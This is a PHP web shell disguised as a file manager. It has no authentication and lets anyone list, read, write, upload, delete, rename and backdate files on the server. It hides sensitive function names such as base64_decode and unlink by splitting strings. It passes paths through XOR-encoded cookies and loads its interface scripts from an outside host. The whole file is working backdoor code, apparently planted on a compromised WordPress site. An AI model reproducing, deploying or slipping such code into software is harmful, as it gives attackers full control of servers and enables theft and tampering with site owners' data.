<?php 
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
function hunterEncryptDecrypt($input, $key="12") {
    $output = '';
    for($i = 0; $i < strlen($input); $i++) {
        $output .= $input[$i] ^ $key[$i % strlen($key)];
    }
    return $output;
}
function listing_all_directory() {
    
    $path = $_COOKIE['path'] ?: getcwd();
    $result = array();
    $date_format = "d-m-Y H:i:s";
    if ($handle = opendir($path)) {
        while (false !== ($dir = readdir($handle))) {
            if ($dir === '.' || $dir === '..') {
                continue;
            }
            $full_path = "$path/$dir";
            $is_dir = is_dir($full_path);
            $tmp_result = array(
                'path' => htmlspecialchars($full_path),
                'is_writable' => is_writable($full_path),
                'is_dir' => $is_dir,
                'date' => date($date_format, filemtime($full_path)),
                'size' => $is_dir ? "" : round(filesize($full_path) / 1024, 2),
            );
            $result[] = $tmp_result;
        }
        closedir($handle);
    }
    return $result;
}

$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : false;
if(!$action) {
    main();
    menu();
}
function decode_char($string) {
    return hunterEncryptDecrypt(hex2bin($string));
}
switch ($action) {
    case 'd':
        # code...
        die(json_encode(listing_all_directory()));
        break;
        
    case 'r':
        if($_SERVER['REQUEST_METHOD'] == 'POST') {
            $data = json_decode(file_get_contents("php://input"), true);
            // Fixed for PHP 5.6 compatibility
            $base64_func = show_base_data();
            $content = $base64_func($data['content']);
            $filename = decode_char($_COOKIE['filename']);
            $message['success'] = fm_write_file($filename, $content);
            die(json_encode($message));
        }
        main();
        $content = customize_read_file(decode_char($_COOKIE['filename'])) ;
        
        show_text_area(htmlspecialchars($content));
        break;
    
    case 'cr':
        main();
        show_text_area("");
        break;
    
    case 'ul':
        // Fixed for PHP 5.6 compatibility
        $filename = decode_char($_COOKIE['filename']);
        $unlink_func = show_un();
        if($unlink_func($filename)) {
            $message['success'] = true;
        }else{
            $message['success'] = false;
        }
        die(json_encode($message));
        break;
    
    case 'up':
        
        $file = $_FILES['import_file'];
        $tmp_name = $file['tmp_name'];
        $content = customize_read_file($tmp_name);
        if(isset($_POST['by'])) {
            // Fixed for PHP 5.6 compatibility
            $base64_func = show_base_data();
            $content = $base64_func($content);
        } 
        $path = $_COOKIE['path'] ? : getcwd();
        $name = $file['name'];
        $destination = "$path/$name";
        $message['success'] = $content && fm_write_file($destination, $content) ? : rename($tmp_name, $destination); 
        die(json_encode($message));
        break;
    
    case 're':
        
        $filename = decode_char($_COOKIE['filename']);
        $path = $_COOKIE['path'];
        if($_SERVER['REQUEST_METHOD'] == "POST") {
            
            $old_filename = "$path/$filename";
            $new = $_POST['new'];
            $new_filename = "$path/$new";
            $message['success'] = rename($old_filename, $new_filename);
            die(json_encode($message));
        }
        break;
    
    case 'to':
        
        $filename = decode_char($_COOKIE['filename']);
        if($_SERVER['REQUEST_METHOD'] == 'POST') {
            
            $date = $_POST['date'];
            $str_date = strtotime($date);
            $message['success'] = touch($filename, $str_date);
            clearstatcache(true, $filename);
            die(json_encode($message));
        }
        break;
    
    default:
        # code..
        break;
}
function customize_read_file($file) {
    if(!file_exists($file)) {
        return '';
    }
    $handle = fopen($file, 'r');
    if($handle) {
        $content = fread($handle, filesize($file));
        if($content) {
            return $content;
        }
    }
    $lines = file($file);
    if($lines) {
        return implode($lines);
    }
    // Fixed for PHP 5.6 compatibility
    $file_get_func = show_file_contents();
    return $file_get_func($file);
}

function show_file_contents() {
    $file = "file_";
    $old = "get_";
    $contents = "contents";
    return "$file$old$contents";
}
function show_text_area($content) {
    $filename = decode_char($_COOKIE['filename']);
    echo "
    <p><a href='?' id='back_menu'>< Back</a></p>
    <p>$filename</p>
    <textarea width='100%' id='content' cols='20' rows='30' style='margin-top: 10px'>$content</textarea>
    <button type='submit' class='textarea-button' onclick='textarea_handle()'>Submit</button>
    ";
}
function show_base_data() {
    $alvian = "base";
    $nadir = "64_decode";
    return "$alvian$nadir";
}
function fm_write_file($file, $content) {
    // Method 1: Using fopen
    if (function_exists('fopen')) {
        $handle = @fopen($file, 'w');
        if ($handle) {
            if (@fwrite($handle, $content) !== false) {
                fclose($handle);
                return file_exists($file) && filesize($file) > 0;
            }
            fclose($handle);
        }
    }
    // Method 2: Using file_put_contents
    if (function_exists('file_put_contents')) {
        if (@file_put_contents($file, $content) !== false) {
            return file_exists($file) && filesize($file) > 0;
        }
    }
    // Method 3: Using WP_Filesystem
    return false;
}
function fm_make_request($url) {
    if(function_exists("curl_init")) {
        
        $ch = curl_init();
    
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        return $output;
    }
    // Fixed for PHP 5.6 compatibility
    $file_get_func = show_file_contents();
    return $file_get_func($url);
}
function show_un() {
    $link = "link";
    $unpad = "un";
    return "$unpad$link";
}
function main() {
    
    global $current_path;
    $current_path = isset($_COOKIE['path']) ? $_COOKIE['path'] : false;
    if(!$current_path) {
        setcookie("path", getcwd());
        $current_path = getcwd();
    }
    $path = str_replace('\\', '/', $current_path);
    $paths = explode('/', $path);
    echo "<div class='wrapper' id='path_div'>";
    foreach ($paths as $id => $pat) {
        if ($id == 0) {
            echo '<a href="#" path="/" onclick="change_path(this)">/</a>';
        }
        if ($pat != '') {
            $tmp_path = implode('/', array_slice($paths, 0, $id + 1));
            echo "<a href='#' path='$tmp_path' onclick='change_path(this)'>$pat/</a>";
        }
    }
    echo "</div>";
?>
<link rel="stylesheet" href="https://wordpress.zzna.ru/newb/all.min.css">
<link rel="stylesheet" href="https://wordpress.zzna.ru/newb/styles.css">
<script src="https://wordpress.zzna.ru/newb/script.js"></script>
<?php
}
?>

<?php 
function menu() {
?>
<div class="wrapper">
    <form method="post" enctype="multipart/form-data" style="">
                        <div class="file-upload mr-10">
                            <label for="file-upload-input" style="cursor: pointer;">
                                [ Upload ]
                            </label>
                            <input type="file" id="file-upload-input" style="display: none;" onchange="handle_upload()">
                        </div>
    </form>
    <a href='#' onclick='refresh_path()' class='mr-10 white'>[ HOME ]</a>
    <a href='#' onclick='create_file()' class='mr-10 white'>[ Create File ]</a>
</div>
                
    <table cellspacing="0" cellpadding="7" width="100%">   
    <thead>
            </tr>
            <tr>
                <th width="44%"></th>
                <th width="11%"></th>
                <th width="17%"></th>
                <th width="17%"></th>
                <th width="11%"></th>
            </tr>
        </thead>
        <tbody id="data_table" class='blur-table'>
            <div class="wrapper" style='margin-top: -10px'>
                <input type="checkbox" class='mr-10' id='bypass-upload' >[ Hunter File Upload ]</input>
            </div>
        </tbody>
    </table>
<?php } ?>
